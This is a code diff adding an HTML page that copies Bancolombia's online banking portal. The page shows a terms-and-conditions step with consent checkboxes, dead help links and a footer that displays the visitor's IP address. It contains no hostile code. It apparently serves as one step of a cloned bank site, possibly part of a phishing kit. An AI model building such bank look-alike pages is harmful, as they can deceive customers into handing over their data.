@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sucursal Virtual Personas - Bancolombia</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="terminos.js" defer></script>
+</head>
+<body>
+    <div class="auth-container">
+        <div class="auth-content">
+            <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="logo">
+            <h1>Sucursal Virtual Personas</h1>
+            
+            <div class="auth-box">
+                <h2>Términos y Condiciones</h2>
+                <p>Por favor, lee y acepta los siguientes términos:</p>
+                
+                <form id="terminosForm" class="auth-form">
+                    <div class="terminos-container">
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="termino1" class="termino-check">
+                            <label for="termino1">Autorizo el uso y tratamiento de mis datos personales y biométricos.</label>
+                        </div>
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="termino2" class="termino-check">
+                            <label for="termino2">Acepto los términos y condiciones de la Sucursal Virtual.</label>
+                        </div>
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="termino3" class="termino-check">
+                            <label for="termino3">Confirmo que soy el titular de la cuenta y la información proporcionada es verídica.</label>
+                        </div>
+                    </div>
+                    <div class="button-container">
+                        <button type="submit" class="btn-iniciar" disabled>Continuar</button>
+                        <button type="button" class="btn-cancelar">Cancelar</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <div class="help-links">
+            <a href="#">¿Problemas para conectarte?</a>
+            <span class="separator">•</span>
+            <a href="#">Aprende sobre seguridad</a>
+            <span class="separator">•</span>
+            <a href="#">Reglamento Sucursal Virtual</a>
+            <span class="separator">•</span>
+            <a href="#">Política de privacidad</a>
+        </div>
+
+        <footer class="footer">
+            <div class="footer-content">
+                <div class="footer-left">
+                    <img src="img/logo-bancolombia-blanco.png" alt="Bancolombia" class="footer-logo">
+                    <img src="img/SFC_NEGRO_1_1.png" alt="SFC" class="sfc-logo">
+                </div>
+                <div class="footer-right">
+                    <p class="ip-address" id="ipAddress">Cargando IP...</p>
+                    <p class="datetime" id="datetime">Cargando fecha y hora...</p>
+                </div>
+            </div>
+        </footer>
+    </div>
+</body>
+</html>
